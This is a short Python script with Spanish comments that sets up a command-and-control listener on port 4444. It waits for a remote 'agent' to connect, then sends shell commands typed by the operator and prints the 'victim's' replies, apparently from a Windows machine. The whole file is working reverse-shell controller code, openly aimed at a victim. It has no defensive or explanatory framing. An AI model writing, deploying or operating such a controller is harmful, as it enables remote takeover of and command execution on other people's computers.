import socket

def iniciar_servidor():
    # Creamos el socket TCP
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Escuchamos en todas las IPs locales en el puerto 4444
    server.bind(("0.0.0.0", 4444))
    server.listen(1)
    print("[*] Servidor C2 iniciado. Esperando conexión del agente...")
    
    # Aceptamos la conexión
    conn, addr = server.accept()
    print(f"[+] ¡CONEXIÓN EXITOSA! Agente detectado desde: {addr}")

    while True:
        # Pedimos un comando al usuario
        comando = input("C2_Shell> ")
        if comando.lower() == "exit":
            conn.close()
            break
        
        # Enviamos el comando y recibimos la respuesta
        conn.send(comando.encode())
        respuesta = conn.recv(4096).decode('cp850', errors='replace')
        print(f"\nRespuesta de la víctima:\n{respuesta}")

if __name__ == "__main__":
    iniciar_servidor()
